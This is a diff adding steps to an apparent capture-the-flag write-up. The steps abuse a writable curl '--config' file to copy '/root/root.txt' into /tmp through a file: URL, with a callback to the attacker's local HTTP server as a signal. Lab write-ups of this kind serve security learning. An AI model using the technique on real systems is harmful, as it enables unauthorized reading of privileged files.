@@ -89,7 +89,17 @@ url = "http://127.0.0.1"
 
 Given this output, you can relate to curl `--config` flag. Thus, you can rewrite that file as follow:
 
+
 ```bash
+# To get "ping" when the file has been fetched
+local$ python -m SimpleHTTPServer 1234
+```
+
+```bash
+# On the remote  server
 url = "file:/root/root.txt"
 -o /tmp/root.txt
+url = "http://<local_IP>:1234"
 ```
+
+When you receive a GET request from the RHOST you know you can read the new `root.txt` file located in `/tmp`. w00t! ;)
